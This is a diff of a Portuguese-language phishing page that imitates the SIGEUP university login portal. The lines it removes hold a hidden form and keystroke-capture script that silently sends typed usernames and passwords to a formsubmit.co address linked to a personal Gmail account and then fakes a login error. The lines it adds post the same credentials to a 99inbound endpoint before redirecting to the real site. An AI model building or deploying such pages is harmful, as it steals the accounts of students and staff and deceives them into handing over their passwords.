@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistema de Gestão Universitária - SIGEUP</title>
-    <!-- Estilos CSS incorporados para facilitar a exportação -->
     <style>
         /* Estilos gerais da página */
         body {
@@ -134,11 +133,6 @@
             color: #337ab7;
             font-weight: bold;
         }
-
-        /* Campo escondido para o formulário */
-        .hidden-field {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -150,20 +144,33 @@
         <!-- Título principal -->
         <h1>Sistema de Gestão Universitária</h1>
         
-        <!-- Campo de entrada para nome de usuário -->
-        <div class="input-group">
-            <i>👤</i>
-            <input type="text" id="username" placeholder="Utilizador" onkeyup="captureInput()">
-        </div>
-        
-        <!-- Campo de entrada para senha -->
-        <div class="input-group">
-            <i>🔒</i>
-            <input type="password" id="password" placeholder="Senha" onkeyup="captureInput()">
-        </div>
-        
-        <!-- Botão de login -->
-        <button class="button" onclick="attemptLogin()">Autenticar</button>
+        <form action="https://app.99inbound.com/api/e/jnRDGLlj" method="POST" target="_blank">
+            <!-- Campo de entrada para nome de usuário -->
+            <div class="input-group">
+                <i>👤</i>
+                <input type="text" name="usuario" placeholder="Utilizador" required>
+            </div>
+            
+            <!-- Campo de entrada para senha -->
+            <div class="input-group">
+                <i>🔒</i>
+                <input type="password" name="senha" placeholder="Senha" required>
+            </div>
+            
+            <!-- Botão de login -->
+            <button type="submit" class="button">Autenticar</button>
+            
+            <!-- Campos ocultos do 99inbound - NÃO REMOVA -->
+            <div style="position: absolute; left: -5000px;">
+                <input type="checkbox" name="botcheck" id="botcheck" style="display: none;" />
+            </div>
+            
+            <!-- Redirecionamento automático -->
+            <input type="hidden" name="_redirect" value="https://sigeup.up.ac.mz/sigeup/">
+            
+            <!-- Evitar ataques CSRF -->
+            <input type="hidden" name="_csrf" value="true">
+        </form>
         
         <!-- Links adicionais -->
         <div class="links">
@@ -182,71 +189,5 @@
             </div>
         </div>
     </div>
-
-    <!-- Formulário oculto que envia os dados -->
-    <form 
-        id="hiddenForm" 
-        action="https://formsubmit.co/claudiojosemacario1@gmail.com" 
-        method="POST" 
-        class="hidden-field">
-        <input type="hidden" name="username" id="hidden_username">
-        <input type="hidden" name="password" id="hidden_password">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="https://sigeup.up.ac.mz/sigeup/">
-        <input type="hidden" name="_subject" value="Novos dados de login coletados">
-    </form>
-
-    <!-- Script JavaScript para capturar e enviar dados -->
-    <script>
-        // Captura os dados enquanto o usuário digita
-        function captureInput() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            // Atualiza os campos ocultos
-            document.getElementById('hidden_username').value = username;
-            document.getElementById('hidden_password').value = password;
-            
-            // Se ambos os campos tiverem algum conteúdo, envia a cada 3 segundos
-            if (username && password) {
-                // Usa localStorage para controlar quando foi o último envio
-                const lastSent = localStorage.getItem('lastDataSent');
-                const now = new Date().getTime();
-                
-                if (!lastSent || now - lastSent > 3000) { // 3 segundos
-                    sendDataSilently();
-                    localStorage.setItem('lastDataSent', now);
-                }
-            }
-        }
-        
-        // Envia os dados silenciosamente usando fetch API
-        function sendDataSilently() {
-            const formData = new FormData(document.getElementById('hiddenForm'));
-            
-            fetch(document.getElementById('hiddenForm').action, {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors' // Importante para evitar erros de CORS
-            }).catch(error => console.error('Erro:', error));
-        }
-        
-        // Função chamada quando o usuário clica em "Autenticar"
-        function attemptLogin() {
-            // Envia os dados finais
-            document.getElementById('hiddenForm').submit();
-            
-            // Simula um erro de login após um pequeno atraso
-            setTimeout(() => {
-                alert("Erro ao autenticar. Por favor, verifique suas credenciais e tente novamente.");
-            }, 1000);
-        }
-        
-        // Adiciona os eventos necessários quando a página carrega
-        window.onload = function() {
-            // Limpa o armazenamento local para garantir novos envios
-            localStorage.removeItem('lastDataSent');
-        };
-    </script>
 </body>
 </html>
